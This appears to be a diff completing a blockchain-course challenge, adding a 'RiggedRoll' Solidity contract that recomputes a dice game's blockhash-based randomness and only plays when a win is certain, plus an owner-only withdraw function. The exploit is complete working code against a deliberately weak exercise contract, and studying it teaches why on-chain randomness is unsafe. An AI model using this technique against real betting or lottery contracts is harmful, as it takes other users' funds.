@@ -1,9 +1,12 @@
-pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
+pragma solidity >=0.8.0 <0.9.0;
 //SPDX-License-Identifier: MIT
 
 import "hardhat/console.sol";
 import "./DiceGame.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
+
+error RiggedRoll__notAWinner();
+error RiggedRoll__transactionFailed();
 
 contract RiggedRoll is Ownable {
 
@@ -13,12 +16,24 @@ contract RiggedRoll is Ownable {
         diceGame = DiceGame(diceGameAddress);
     }
 
-    //Add withdraw function to transfer ether from the rigged contract to an address
+    receive() external payable {}
 
+    function riggedRoll() public {
+        bytes32 prevHash = blockhash(block.number - 1);
+        
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
+        uint256 roll = uint256(hash) % 16;
 
-    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+        if (roll > 2 ) {
+            revert RiggedRoll__notAWinner();
+        }
+        require(address(this).balance >= .002 ether, "No ETH in Contract");
+        uint256 valueToSend = 0.002 ether;
+        diceGame.rollTheDice{value: valueToSend}();
+    }
 
-
-    //Add receive() function so contract can receive Eth
-    
+    function withdraw(address _addr, uint256 _amount) public onlyOwner {
+        require(address(this).balance >= _amount, "amount is greater than contract balance");
+        payable(_addr).transfer(_amount);
+    }
 }
